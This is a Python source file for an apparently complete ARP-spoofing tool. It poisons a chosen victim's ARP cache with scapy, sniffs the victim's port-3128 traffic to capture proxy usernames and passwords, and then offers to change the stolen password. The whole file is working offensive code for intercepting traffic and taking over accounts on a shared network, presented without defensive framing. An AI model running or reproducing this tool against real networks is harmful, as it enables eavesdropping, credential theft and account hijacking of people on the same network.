import sys

from scapy.all import ARP, send, sniff

from .change_password import change_pass
from .utils import (ip_to_mac, get_interface, get_arp_table,
                    get_ip, get_proxy_pass)


def cleanup(victim_ip, gateway_ip):
    """
    Send ARP response from gateway to victim to restore correct behavior
    """
    gateway_mac = ip_to_mac(gateway_ip)
    # gateway_ip says to victim_ip that "gateway_ip is at gateway_mac"
    arp_gateway_to_victim = ARP(
        op=ARP.is_at, pdst=victim_ip, psrc=gateway_ip,
        hwdst="ff:ff:ff:ff:ff:ff", hwsrc=gateway_mac
    )
    send(arp_gateway_to_victim, verbose=0)


def poisoning(gateway_ip, victim_ip, count=20):
    """
    Send falsified ARP reply to victim IP
    :param gateway_ip: Gateway IP
    :param victim_ip: Victim IP
    :param count: Number ARP replies to be sent
    :return: None
    """
    # ARP response: (gateway_ip, attacker_mac) to victim_ip 
    attacker_mac = ARP().hwsrc
    arp_gateway_to_victim = ARP(
        op=ARP.is_at, pdst=victim_ip, psrc=gateway_ip, hwdst=attacker_mac
    )
    send(arp_gateway_to_victim, count=count, verbose=0)


def attack(victim_ip, gateway_ip):
    """
    Carry out the attack.
    :param victim_ip: Victim IP
    :param gateway_ip: Gateway IP
    :return: None
    """
    print("Victim IP: {}".format(victim_ip))
    print("Gateway IP: {}".format(gateway_ip))

    print("Spoofing...")
    poisoning(gateway_ip, victim_ip)
    print("Spoofing done.")

    print("Sniffing")
    print("Sniffing IP/TCP packets (port 3128) from {}".format(victim_ip))
    filter_str = "ip and src {} and tcp and port 3128".format(victim_ip)
    sniff(filter=filter_str, count=100, prn=get_proxy_pass, timeout=100)
    # sniff(filter=filter_str, count=50, prn=lambda x: x.summary(), timeout=100)

    print("Cleaning up...")
    cleanup(victim_ip, gateway_ip)
    print("Cleanup done.")


def main():
    """
    Main Driver function
    :return: None
    """
    if sys.version_info[0] < 3:
        raise Exception("Must be using Python 3")
    print("Listing possible targets...")
    arp_table = get_arp_table()
    for arp_entry in arp_table:
        print(arp_entry[0])
    print("Above IPs share the same router/gateway.\n")
    victim_ip = get_ip()
    gateway_ip = get_ip(victim=False)
    get_interface()

    attack(victim_ip, gateway_ip)
    from . import PROXY_USER_PASS
    if PROXY_USER_PASS:
        PROXY_USER_PASS = list(PROXY_USER_PASS)
        proxy_user_pass = PROXY_USER_PASS[0]
        username = str(proxy_user_pass[0])
        old_pass = str(proxy_user_pass[1])
        print("Proxy password for {} is {}".format(username, old_pass))
        change_pass_action = str(input("Would you like to change this password [y/n]: "))
        if change_pass_action != "y":

            sys.exit("Exiting without changing password!")
        new_pass = input("Enter new passwd: ")
        resp = change_pass(username, old_pass, new_pass)
        print("Response status code : {}".format(resp.status_code))
        incorrect_pass = "Wrong password for user"
        pass_changed = "Password changed for user"
        error_500 = "Internal Server Error"
        if incorrect_pass in resp.text:
            print("Incorrect password")
        elif pass_changed in resp.text:
            print("Password changed")
        elif error_500 in resp.text:
            print("Server Error")
    else:
        print("Result: Could not find password!")
        print("Try sniffing more packets. Default is 100 packets.")


if __name__ == "__main__":
    main()
